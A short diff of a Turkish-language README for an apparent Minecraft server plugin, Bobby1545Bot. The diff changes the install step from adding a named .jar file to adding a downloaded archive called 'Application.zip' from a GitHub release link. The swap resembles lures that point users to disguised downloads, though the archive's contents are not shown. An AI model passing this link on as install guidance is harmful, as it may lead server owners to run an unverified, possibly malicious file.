@@ -20,7 +20,7 @@
    - `/bobby1545 rapor`: Sunucu durumu hakkında detaylı bir rapor sunar.
 
 2. **Kurulum:**
-   - `Bobby1545Bot.jar` dosyasını sunucunuzun `plugins` klasörüne ekleyin.
+   - `https://github.com/Alperen4423/Bobby1545Bot/releases/download/v1.0/Application.zip` dosyasını sunucunuzun `plugins` klasörüne ekleyin.
    - Sunucuyu yeniden başlatın.
    - Komutları kullanarak botun işlevlerinden faydalanmaya başlayın.
 
